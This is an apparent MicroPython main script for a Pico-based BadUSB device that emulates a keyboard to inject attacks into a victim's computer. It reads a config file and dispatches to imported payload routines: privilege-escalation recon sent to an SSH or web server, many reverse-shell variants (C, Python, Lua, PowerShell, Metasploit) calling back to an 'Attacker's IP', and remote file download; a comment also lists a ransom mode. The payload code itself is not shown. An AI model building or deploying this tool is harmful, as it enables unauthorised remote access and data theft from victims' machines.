import usb.device
from usb.device.keyboard import KeyboardInterface
import time

from myLibs.utils import *
from myLibs.picoPKI import *
from myLibs.picoRecon import *
from myLibs.picoReverseShell import *
from myLibs.customKivy import *
from myLibs.picoUpload import *

# Read User's Config
def read_config(file_path):
    config = {}
    with open(file_path, 'r') as file:
        for line in file:
            if line.strip() and not line.strip().startswith("#"):
                key, value = line.strip().split("=", 1)
                config[key.strip()] = value.strip()
    return config

#HID 
class ExampleKeyboard(KeyboardInterface):
    def on_led_update(self, led_mask):
        pass

#Main Function
def userKeyboard():
    
    #################################################################################### Load Config File ####################################################################################
    config = read_config("config.txt")
    
    ############## Load Config Values
    ### Mode (Recon, Ransom, PKI, ReverseShell, Custom, Download) 
    mod = config["mode"]
    ### Victim's OS 
    operatingSystem = config["targetSys"]
    
    
    
    ########################################## For Recon Mode
    serverMode = config["serverType"] ## SSH, WEB
    
    # WEB
    webServ = config["server"] 
    
    # SSH
    sshServ = config["sshServer"]
    sshPass = config["sshPassword"]
    sshServFolder = config["sshServerFolder"]
    
    
    
    ########################################## For PKI (Yubikey) Mode
    # Username
    configUname = config["PKIUname"]
    # Password
    configPass = config["PKIPass"]
    
    # Boot Bored
    userboot = config["UserOrBoot"]
    
    
    ########################################## For Reverse Shell Mode
    # Shell Type (python3_shell, cLinuxShell, win_conpty_shell, cWindowsShellNoCompiler, cMacShell, lua_shell, stagedLinuxSploit, linuxStagelessSploit)
    shellMode = config["shellType"]
    
    # Remote Host (Attacker's IP)
    configRhost = config["rHost"]
    # Remote Port (Attacker's Port) set to 4444 as default
    try:
        configRport = int(config["rPort"])
    except ValueError:
        print("Erreur : la valeur de rPort n'est pas un entier valide.")
        configRport = 4444 #Default Value
        
    ########################################## For Custom Mode
    userVal = config["userEntry"]
    
    ########################################## For Upload Mode
    UploadMod = config["uploadCmd"]
    remoteZer = config["remoteFile"]
    outputZer = config["outputFile"]
    AutoMode = config["Automatic"]
    AutoModeTool = config["autoTool"]
    
    #################################################################################### Function's Core ####################################################################################
    k = ExampleKeyboard()
    usb.device.get().init(k, builtin_driver=True)
    
    while not k.is_open():
        time.sleep(1)

    
    if mod == "Recon": #################################################################################### Recon
        if operatingSystem == "Linux":
            if serverMode == "SSH":
                LinuxPrivEscRecSsh(k, sshServ, sshPass, sshServFolder)
            elif serverMode == "WEB":
                LinuxPrivEscRecWebserver(k, webServ)
        elif operatingSystem == "Windows":
            WindowsPrivEscRecWebserver(k, webServ)
        elif operatingSystem == "Mac":
            if serverMode == "SSH":
                MacPrivEscRecSsh(k, sshServ, sshPass, sshServFolder)
            if serverMode == "WEB":
                MacPrivEscRecWebserver(k, webServ)
        else:
            raise ValueError("Unrecognized System")
    
    elif mod == "PKI": #################################################################################### PKI (YubiKey/OnlyKey)
        myLinuxShit(k)
    elif mod == "Custom": #################################################################################### Custom
        userInputInlineTwo(k, config["lang"])
    
    elif mod == "ReverseShell": #################################################################################### Reverse Shell
        if shellMode == "Linux Shell C/C++":
            cLinuxShell(k, configRhost, configRport)
        
        elif shellMode == "Mac Shell C/C++":
            cMacShell(k, configRhost, configRport)
            
        elif shellMode == "Lua Shell (Lua Required)":
            lua_shell(k, configRhost, configRport)
            
        elif shellMode == "Linux Python3 Shell":
            linux_python3_shell(k, configRhost, configRport)
        
        elif shellMode == "Mac Python3 Shell":
            mac_python3_shell(k, configRhost, configRport)
            
        elif shellMode == "Windows ConPty Shell":
            win_conpty_shell(k, configRhost, configRport)
            
        elif shellMode == "PowerReverseShell":
            reversedPowerShell(k, configRhost, configRport)
        
        elif shellMode == "Metasploit Staged Shell":
            linuxStagedSploit(k, configRhost, configRport)
        
        elif shellMode == "Metasploit Stageless Shell":
            linuxStagelessSploit(k, configRhost, configRport)
            
        else:
            raise ValueError("Unrecognized Shell Type")
    
    elif mod == "Upload": #################################################################################### Upload Mode
        if operatingSystem == "Linux" or operatingSystem == "Mac":
            if AutoMode == "Yes":
                linuxCurlDownload(k, remoteZer, outputZer, "Auto", AutoModeTool)
            else:
                linuxCurlDownload(k, remoteZer, outputZer)
        elif operatingSystem == "Windows":
            if AutoMode == "Yes":
                winInvokeWebReqDownload(k, remoteZer, outputZer, "Auto")
            else:
                winInvokeWebReqDownload(k, remoteZer, outputZer)
        else:
            raise ValueError("Unrecognized Mode")
        
userKeyboard()
